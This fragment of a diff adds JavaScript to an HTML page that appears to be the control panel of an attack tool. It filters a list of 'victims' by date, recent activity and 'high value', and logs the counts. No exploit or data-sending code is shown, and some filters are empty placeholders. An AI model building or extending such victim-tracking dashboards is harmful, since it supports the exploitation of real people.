+        // Filter functions
+        function showAllVictims() {
+            addLog('🔍 Showing all victims', 'info');
+            renderVictims();
+        }
+
+        function showTodayVictims() {
+            const today = new Date().toDateString();
+            const todayVictims = victims.filter(v => new Date(v.timestamp).toDateString() === today);
+            addLog(`🔍 Showing ${todayVictims.length} victims from today`, 'info');
+            // Implementation to filter display
+        }
+
+        function showActiveVictims() {
+            const active = victims.filter(v => (Date.now() - new Date(v.timestamp)) < 3600000);
+            addLog(`🔍 Showing ${active.length} active victims`, 'info');
+            // Implementation to filter display
+        }
+
+        function showHighValueVictims() {
+            const highValue = victims.filter(v => (v.value || 0) >= 80);
+            addLog(`🔍 Showing ${highValue.length} high-value victims`, 'info');
+            // Implementation to filter display
+        }
+
+        // Initialize when page loads
+        document.addEventListener('DOMContentLoaded', initControlPanel);
+        window.lastControlUpdate = Date.now();
+
+        console.log('🕵️ Advanced control panel initialized');
     </script>
 </body>
 </html>
